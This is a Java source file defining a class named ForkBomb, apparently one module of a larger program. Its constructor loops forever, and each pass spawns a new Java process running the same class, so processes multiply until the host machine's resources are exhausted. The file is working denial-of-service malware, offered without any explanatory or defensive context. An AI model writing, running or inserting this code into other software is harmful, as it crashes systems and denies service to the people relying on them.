package Modules;

import java.io.IOException;

public class ForkBomb {
    public ForkBomb() {
        while(true) {
            try {
                Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "Modules.ForkBomb"});
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
